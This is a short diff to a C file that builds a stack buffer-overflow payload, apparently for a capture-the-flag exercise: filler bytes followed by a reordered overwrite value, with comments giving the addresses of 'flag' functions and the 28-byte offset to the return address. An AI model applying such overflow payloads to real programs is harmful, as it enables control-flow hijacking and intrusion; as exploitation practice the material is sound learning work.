@@ -15,8 +15,7 @@ unsigned char payload[] =
 	{'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
 	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
 	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
-	'H', 'A', 'H', 'A', 0xbb, 0x71, 0x88, 0x0c,
-	0xef, 0xbe, 0xad, 0xde};
+	0xef, 0xbe, 0xad, 0xde, 0xbb, 0x71, 0x88, 0x0c};
 	//0x0c88724b is memory address of flag 1 function
 	//0x0c8871bb is memory address of flag 2 function
 	// Need 24 (to reach rbp) plus 4 bytes (28 total) to overwrite into return address
